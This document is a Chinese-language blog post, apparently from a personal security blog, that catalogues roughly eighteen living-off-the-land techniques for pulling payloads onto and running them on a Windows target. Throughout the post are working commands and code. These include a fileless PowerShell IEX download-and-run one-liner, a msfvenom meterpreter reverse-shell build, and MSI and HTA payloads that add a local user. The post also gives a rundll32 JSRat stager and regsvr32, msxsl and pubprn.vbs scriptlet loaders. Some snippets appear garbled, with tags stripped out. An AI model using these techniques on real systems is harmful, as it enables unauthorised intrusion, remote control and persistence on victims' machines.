@@ -1,0 +1,797 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
+  <link rel="icon" type="image/png" href="/img/head.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="SE_Null">
+  <meta name="keywords" content="">
+  <title>payload下载 - SE_Null</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>SE_Null</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-05 20:48" pubdate>
+        October 5, 2020 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      34
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">payload下载</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>执行机器：win7  192.168.43.78</p>
+<p>服务器：win2k8+phpstudy  192.168.43.127</p>
+<h2 id="1-vbs"><a href="#1-vbs" class="headerlink" title="1.vbs"></a>1.vbs</h2><p>使用echo将以下内容写入downfile.vbs,写入成功后会在相应的文件夹生成一个downfile.vbs文件</p>
+<pre><code class="hljs shell">C:\Users\haha\Desktop\test&gt;echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  &gt;&gt; downfile.vbs</code></pre>
+
+<p>可使用type查看文件内容<code>type downfile.vbs</code></p>
+<p>使用cscript 结合vbs文件下载payload[exe]：<code>cscript downfile.vbs payload路径 payload落地地址</code></p>
+<pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>aha<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\t</span>est&gt;cscript downfile.vbs http://192.168.43.127/payload.txt C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>aha<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\t</span>est<span class="hljs-symbol">\1</span>.txt</code></pre>
+
+<p>优点:支持windows全版本系列   缺点:对https不友好</p>
+<h2 id="2-certutil"><a href="#2-certutil" class="headerlink" title="2.certutil"></a>2.certutil</h2><p>使用<code>certutil -urlcache -split -f payload地址</code> 来下载文件 </p>
+<pre><code class="hljs shell">C:\Users\haha\Desktop\test&gt;certutil -urlcache -split -f http://192.168.43.127/payload.txt
+****  联机  ****
+  0000  ...
+  000f
+CertUtil: -URLCache 命令成功完成。</code></pre>
+
+<p>在使用后会出现缓存，使用<code>certutil -urlcache -split -f payload地址 delete </code>来删除即可</p>
+<pre><code class="hljs shell">C:\Users\haha\Desktop\test&gt;certutil -urlcache -split -f http://192.168.43.127/pa
+yload.txt delete
+http://192.168.43.127/payload.txt
+
+删除的 WinHttp 缓存项目: 1
+
+CertUtil: -URLCache 命令成功完成。</code></pre>
+
+
+
+<h2 id="3-bitsadmin"><a href="#3-bitsadmin" class="headerlink" title="3.bitsadmin"></a>3.bitsadmin</h2><p>使用<code>bitsadmin /rawreturn /transfer down payload地址 保存payload路径/文件名</code>下载payload[exe]</p>
+<pre><code class="hljs shell">C:\Users\haha\Desktop\test&gt;bitsadmin /rawreturn /transfer down http://192.168.43
+.127/payload.txt C:\Users\haha\Desktop\test\xx.txt</code></pre>
+
+
+
+<h2 id="4-js"><a href="#4-js" class="headerlink" title="4.js"></a>4.js</h2><p>新建一个js文件将以下内容保存</p>
+<pre><code class="hljs reasonml">var WinHttpReq = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)</span>;
+WinHttpReq.<span class="hljs-constructor">Open(<span class="hljs-string">&quot;GET&quot;</span>, WScript.Arguments(0)</span>, <span class="hljs-comment">/*async=*/</span><span class="hljs-literal">false</span>);
+WinHttpReq.<span class="hljs-constructor">Send()</span>;
+BinStream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ActiveXObject(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)</span>;
+BinStream.Type = <span class="hljs-number">1</span>;
+BinStream.<span class="hljs-constructor">Open()</span>;
+BinStream.<span class="hljs-constructor">Write(WinHttpReq.ResponseBody)</span>;
+BinStream.<span class="hljs-constructor">SaveToFile(<span class="hljs-string">&quot;payload目标机器保存文件名&quot;</span>)</span>;</code></pre>
+
+<p>使用<code>cscript /nologo 上述js文件名 payload地址</code> 下载payload[exe]</p>
+<pre><code class="hljs latex">C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">haha</span></span><span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">test</span></span>&gt;cscript /nologo 1.js http://192.168.43.127/payload.tx
+t</code></pre>
+
+<p>下载完成后所下载的文件会保存在js文件同一目录下</p>
+<h2 id="5-wget"><a href="#5-wget" class="headerlink" title="5.wget"></a>5.wget</h2><p>需要将wget.exe上传到目标机器，在相应目录下执行<code>wget -O &quot;payload落地文件名&quot; payload地址</code>即可下载payload[exe]</p>
+<p>wget地址：<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/wget/">https://eternallybored.org/misc/wget/</a></p>
+<h2 id="6-curl"><a href="#6-curl" class="headerlink" title="6.curl"></a>6.curl</h2><p>直接在相应目录的cmd下执行<code>curl payload地址 -o 落地文件名</code>下载payload[exe]</p>
+<pre><code class="hljs angelscript">C:\Users\haha\Desktop\新建文件夹&gt;curl http:<span class="hljs-comment">//192.168.43.127/11.exe -o 1x.exe</span>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+<span class="hljs-number">100</span>  <span class="hljs-number">366</span>k  <span class="hljs-number">100</span>  <span class="hljs-number">366</span>k    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   <span class="hljs-number">366</span>k      <span class="hljs-number">0</span>  <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> --:--:--  <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> <span class="hljs-number">11.5</span>M</code></pre>
+
+
+
+<h2 id="7-powershell"><a href="#7-powershell" class="headerlink" title="7.powershell"></a>7.powershell</h2><h3 id="1-下载payload-exe-到本地"><a href="#1-下载payload-exe-到本地" class="headerlink" title="1.下载payload[exe]到本地"></a>1.下载payload[exe]到本地</h3><p><code>powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;payload地址&#39;,&#39;payload落地地址&#39;)</code>或者是</p>
+<p><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;payload地址&#39;,&#39;payload落地地址&#39;)</code></p>
+<pre><code class="hljs stylus">C:\Users\haha\Desktop\test&gt;powershell -exec bypass -c (new-<span class="hljs-selector-tag">object</span> System<span class="hljs-selector-class">.Net</span>.Web
+Client).DownloadFile(<span class="hljs-string">&#x27;http://192.168.43.127/payload.txt&#x27;</span>,<span class="hljs-string">&#x27;C:\Users\haha\Desktop\</span>
+<span class="hljs-string">test\2.txt&#x27;</span>)
+或者
+C:\Users\haha\Desktop\test&gt;powershell (new-<span class="hljs-selector-tag">object</span> System<span class="hljs-selector-class">.Net</span>.WebClient).Download
+<span class="hljs-function"><span class="hljs-title">File</span><span class="hljs-params">(<span class="hljs-string">&#x27;http://192.168.43.127/payload.txt&#x27;</span>,<span class="hljs-string">&#x27;evil.txt&#x27;</span>)</span></span></code></pre>
+
+<h3 id="2-远程执行命令，无文件落地"><a href="#2-远程执行命令，无文件落地" class="headerlink" title="2.远程执行命令，无文件落地"></a>2.远程执行命令，无文件落地</h3><p><code>powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;payload地址&#39;))&quot;</code></p>
+<h2 id="8-ipc-文件共享"><a href="#8-ipc-文件共享" class="headerlink" title="8.ipc$文件共享"></a>8.ipc$文件共享</h2><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。（此时关闭了PHP study）</p>
+<p>建立远程IPC连接:<code>net use \\目标ip\ipc$ /user:administrator &quot;密码&quot; </code> (注意是管理员)<br>复制远程文件到本地主机:<code>copy \\目标ip\c$\payload payload落地地址 </code></p>
+<p>查看目标机器是否开启IPC服务<code>net share</code></p>
+<pre><code class="hljs shell">C:\Users\haha&gt;net share
+
+共享名       资源                            注解
+
+-------------------------------------------------------------------------------
+<span class="hljs-meta">C$</span><span class="bash">           C:\                             默认共享</span>
+<span class="hljs-meta">IPC$</span><span class="bash">                                         远程 IPC</span>
+<span class="hljs-meta">ADMIN$</span><span class="bash">       C:\Windows                      远程管理</span>
+命令成功完成。
+C:\Users\haha&gt;</code></pre>
+
+
+
+<h2 id="9-ftp"><a href="#9-ftp" class="headerlink" title="9.ftp"></a>9.ftp</h2><p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p>
+<p><code>ftp 127.0.0.1</code></p>
+<p><code>username</code></p>
+<p><code>password</code></p>
+<p><code>get payload</code></p>
+<p><code>exit</code></p>
+<h2 id="10-TFTP"><a href="#10-TFTP" class="headerlink" title="10.TFTP"></a>10.TFTP</h2><p>用来下载远程文件的最简单的网络协议，它基于UDP协议而实现</p>
+<p>tftp32服务端下载地址：<a target="_blank" rel="noopener" href="http://tftpd32.jounin.net/tftpd32_download.html">http://tftpd32.jounin.net/tftpd32_download.html</a></p>
+<p><code>tftp -i vps-IP get payload 存放位置</code></p>
+<h2 id="11-WinScp"><a href="#11-WinScp" class="headerlink" title="11.WinScp"></a>11.WinScp</h2><p>WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。</p>
+<p>上传文件：<code>winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://账户:密码@192.168.43.127:22&quot; &quot;option transfer binary&quot; &quot;put D:\1.txt /tmp/&quot; &quot;exit&quot; /log=log_file.txt </code></p>
+<p>下载文件：<code>winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://账户:密码@192.168.43.127:22&quot; &quot;option transfer binary&quot; &quot;get /tmp D:\test\app\&quot; &quot;exit&quot; /log=log_file.txt</code></p>
+<h2 id="12-msiexec"><a href="#12-msiexec" class="headerlink" title="12.msiexec"></a>12.msiexec</h2><p>msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p>
+<pre><code class="hljs jboss-cli"><span class="hljs-comment">#生成msi包</span>
+msfvenom -p windows/exec CMD=&#x27;net user test abc123! <span class="hljs-string">/add</span>&#x27; -f msi &gt; evil.msi
+<span class="hljs-comment">#远程执行添加一个test用户</span>
+msiexec <span class="hljs-string">/q</span> <span class="hljs-string">/i</span> http:<span class="hljs-string">//192.168.43.127/evil.msi</span></code></pre>
+
+
+
+<h2 id="13-IEExec"><a href="#13-IEExec" class="headerlink" title="13.IEExec"></a>13.IEExec</h2><p>IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。</p>
+<p>生成Payload：</p>
+<pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=3333 -f exe -o evil.exe</code></pre>
+
+<p>使用管理员身份打开cmd，分别运行下面两条命令。</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Windows\Microsoft.NET\Framework<span class="hljs-number">64</span>\v<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">50727</span>&gt;caspol.exe -s <span class="hljs-literal">off</span>
+<span class="hljs-attribute">C</span>:\Windows\Microsoft.NET\Framework<span class="hljs-number">64</span>\v<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">50727</span>&gt;IEExec.exe http://<span class="hljs-number">192.168.43.127</span>/evil.exe</code></pre>
+
+
+
+<h2 id="14-mshta"><a href="#14-mshta" class="headerlink" title="14.mshta"></a>14.mshta</h2><p>mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。</p>
+<p><code>mshta http://192.168.43.127/payload.hta</code></p>
+<p>payload.hta内容如下</p>
+<pre><code class="hljs stata"><span class="hljs-keyword">Window</span>.ReSizeTo 0, 0
+<span class="hljs-keyword">Window</span>.moveTo -2000,-2000
+<span class="hljs-keyword">Set</span> objShell = CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)
+objShell.<span class="hljs-keyword">Run</span> <span class="hljs-string">&quot;cmd.exe /c net user test password /add&quot;</span> <span class="hljs-comment">// 这里填写命令</span>
+self.<span class="hljs-keyword">close</span>
+demo</code></pre>
+
+
+
+<h2 id="15-rundll32"><a href="#15-rundll32" class="headerlink" title="15.rundll32"></a>15.rundll32</h2><p>其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Hood3dRob1n/JSRat-Py.git">https://github.com/Hood3dRob1n/JSRat-Py.git</a></p>
+<p>步骤一，开始运行JSRat，监听本地8888端口：<code>./JSRat.py -i 192.168.43.30 -p 3333</code></p>
+<p>步骤二：通过url访问，可以查看恶意代码。复制代码如下：</p>
+<pre><code class="hljs reasonml">rundll32.exe javascript:<span class="hljs-string">&quot;\..\mshtml,RunHTMLApplication &quot;</span>;document.write<span class="hljs-literal">()</span>;h=<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)</span>;h.<span class="hljs-constructor">Open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.43.30:3333/connect&quot;</span>,<span class="hljs-params">false</span>)</span>;<span class="hljs-keyword">try</span>&#123;h.<span class="hljs-constructor">Send()</span>;b=h.ResponseText;eval(b);&#125;catch(e)&#123;<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>)</span>.<span class="hljs-constructor">Run(<span class="hljs-string">&quot;cmd /c taskkill /f /im rundll32.exe&quot;</span>,0,<span class="hljs-params">true</span>)</span>;&#125;</code></pre>
+
+<p>步骤三：在受害者PC运行该代码，将成功返回一个会话</p>
+<h2 id="16-regsvr32"><a href="#16-regsvr32" class="headerlink" title="16.regsvr32"></a>16.regsvr32</h2><p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p>
+<p>在目标机上执行：<code>regsvr32.exe /u /n /s /i:http://192.168.43.127/file.sct scrobj.dll</code></p>
+<p>可以通过自己构造file.sct文件，去下载执行我们的程序，例如执行以下命令，成功弹计算器。（本次机器未复现成功）</p>
+<pre><code class="hljs routeros">&lt;?XML <span class="hljs-attribute">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>?&gt; 
+	<span class="hljs-attribute">progid</span>=<span class="hljs-string">&quot;ShortJSRAT&quot;</span>
+    <span class="hljs-attribute">classid</span>=<span class="hljs-string">&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt; 
+    	ps  = <span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span>;
+        new ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).<span class="hljs-builtin-name">Run</span>(ps,0,<span class="hljs-literal">true</span>);
+      ]]&gt;</code></pre>
+
+
+
+<h2 id="17-MSXSL-EXE"><a href="#17-MSXSL-EXE" class="headerlink" title="17.MSXSL.EXE"></a>17.MSXSL.EXE</h2><p>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</p>
+<p>下载地址为：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=21714">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p>
+<p>msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下可弹出计算器：</p>
+<pre><code class="hljs awk">msxsl http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/scripts/</span>demo.xml http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">43.127</span><span class="hljs-regexp">/scripts/</span>exec.xsl</code></pre>
+
+<p>demo.xml</p>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="hljs-meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">customers</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">customer</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Microsoftname&gt;
+customer&gt;
+customers&gt;</code></pre>
+
+<p>exec.xsl</p>
+<pre><code class="hljs pgsql">&lt;?<span class="hljs-type">xml</span> version=<span class="hljs-string">&#x27;1.0&#x27;</span>?&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot;xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;xmlns:<span class="hljs-keyword">user</span>=&quot;http://mycompany.com/mynamespace&quot;&gt;
+&lt;msxsl:script <span class="hljs-keyword">language</span>=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;
+<span class="hljs-keyword">function</span> <span class="hljs-type">xml</span>(nodelist) 
+&#123;
+	var r = <span class="hljs-built_in">new</span> ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);
+	<span class="hljs-keyword">return</span> nodelist.nextNode().xml;   
+&#125;msxsl:script&gt;&lt;xsl:<span class="hljs-keyword">template</span> match=&quot;/&quot;&gt;   
+&lt;xsl:<span class="hljs-keyword">value</span>-<span class="hljs-keyword">of</span> <span class="hljs-keyword">select</span>=&quot;user:xml(.)&quot;/&gt;
+xsl:<span class="hljs-keyword">template</span>&gt;xsl:stylesheet&gt;</code></pre>
+
+
+
+<h2 id="18-pubprn-vbs"><a href="#18-pubprn-vbs" class="headerlink" title="18.pubprn.vbs"></a>18.pubprn.vbs</h2><p>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于<code>C:\Windows\System32\Printing_Admin_Scripts\en-US</code>，仔细观察该脚本可以发现其显然是由用户提供输入(通过命令行参数)，之后再将参数传递给GetObject()</p>
+<p>在目标机器上执行以下命令会弹出计算器</p>
+<pre><code class="hljs latex">cd C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">Printing</span></span>_Admin_Scripts<span class="hljs-tag">\<span class="hljs-name">zh</span></span>-CN<span class="hljs-tag">\<span class="hljs-name"> </span></span> #en-US
+C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">Printing</span></span>_Admin_Scripts<span class="hljs-tag">\<span class="hljs-name">zh</span></span>-CN&gt;pubprn.vbs&quot; 127.0.0.1 script:http//192.168.43.30/test.sct</code></pre>
+
+<p>test.sct</p>
+<pre><code class="hljs dust"><span class="xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span></span>
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span></span>
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">registration</span></span></span>
+<span class="xml">    description=&quot;Bandit&quot;</span>
+<span class="xml">    progid=&quot;Bandit&quot;</span>
+<span class="xml">    version=&quot;1.00&quot;</span>
+<span class="xml">    classid=&quot;</span><span class="hljs-template-variable">&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;</span><span class="xml">&quot;</span>
+<span class="xml">    remotable=&quot;true&quot;</span>
+<span class="xml">    &gt;</span>
+<span class="xml">registration&gt;</span>
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span></span>
+<span class="xml">        var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span>
+<span class="xml">]]&gt;</span>
+<span class="xml">script&gt;</span>
+<span class="xml">scriptlet&gt;</span></code></pre>
+
+
+
+
+
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_36303045/article/details/112490857">https://blog.csdn.net/weixin_36303045/article/details/112490857</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/vbs/">vbs</a>
+                    
+                      <a class="hover-with-bg" href="/tags/certutil/">certutil</a>
+                    
+                      <a class="hover-with-bg" href="/tags/bitsadmin/">bitsadmin</a>
+                    
+                      <a class="hover-with-bg" href="/tags/js/">js</a>
+                    
+                      <a class="hover-with-bg" href="/tags/wget/">wget</a>
+                    
+                      <a class="hover-with-bg" href="/tags/curl/">curl</a>
+                    
+                      <a class="hover-with-bg" href="/tags/powershell/">powershell</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ipc-%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/">ipc$文件共享</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ftp/">ftp</a>
+                    
+                      <a class="hover-with-bg" href="/tags/tftp/">tftp</a>
+                    
+                      <a class="hover-with-bg" href="/tags/winscp/">winscp</a>
+                    
+                      <a class="hover-with-bg" href="/tags/msiexec/">msiexec</a>
+                    
+                      <a class="hover-with-bg" href="/tags/IEExec/">IEExec</a>
+                    
+                      <a class="hover-with-bg" href="/tags/mshta/">mshta</a>
+                    
+                      <a class="hover-with-bg" href="/tags/rundll32/">rundll32</a>
+                    
+                      <a class="hover-with-bg" href="/tags/regsvr32/">regsvr32</a>
+                    
+                      <a class="hover-with-bg" href="/tags/MSXSL-EXE/">MSXSL.EXE</a>
+                    
+                      <a class="hover-with-bg" href="/tags/pubprn-vbs/">pubprn.vbs</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">端口转发</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/">
+                        <span class="hidden-mobile">免杀文档制作</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <!-- <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div> -->
+    
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
